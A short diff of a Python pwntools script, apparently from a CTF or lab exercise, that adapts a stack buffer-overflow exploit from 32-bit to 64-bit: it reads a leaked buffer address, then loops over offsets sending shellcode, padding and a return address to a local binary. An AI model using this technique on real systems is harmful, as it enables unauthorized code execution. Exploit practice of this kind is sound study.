@@ -41,12 +41,12 @@ def bit64_exploit(binary_name):
         print("roop " , i )
         p = process('./'+binary_name)
         p.recvuntil('buf : ')
-        addr = int(p.recv(10),16)
+        addr = int(p.recv(14),16)
 
-        payload = shellcode_32bit
+        payload = shellcode_64bit
         payload += 'A'*i
-        payload += 'B'*4
-        payload += p32(addr)
+        payload += 'B'*8
+        payload += p64(addr)
         p.sendline(payload)
         sleep(0.1)
         
